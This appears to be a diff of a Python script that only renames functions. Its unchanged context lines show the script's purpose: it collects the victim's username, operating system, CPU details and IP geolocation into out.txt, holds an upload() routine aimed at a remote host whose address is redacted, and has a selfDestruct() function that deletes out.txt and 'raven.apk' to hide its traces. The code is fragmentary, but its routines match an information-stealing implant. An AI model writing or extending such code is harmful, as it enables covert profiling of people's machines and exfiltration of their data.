@@ -7,7 +7,7 @@ import json
 procFile = "/proc/cpuinfo"
 rhost = "http://[REDACTED]:[REDACTED]"
 
-def selfdestruct():
+def selfDestruct():
     try:
         os.remove("out.txt")
         os.remove("raven.apk")
@@ -24,7 +24,7 @@ def upload():
     except FileNotFoundError:
         return None
 
-def getLocation():
+def getIPInfo():
     url = "http://ip-api.com/json"
     try:
         response = requests.get(url)
@@ -54,7 +54,7 @@ def getLocation():
         with open("out.txt", "a", encoding="utf-8") as out:
             json.dump(location, out, indent=4)
 
-def mainInfoRecognizing():
+def getOSInfo():
     username = os.getlogin()
     targetOS = platform.system() + " " + platform.release()
 
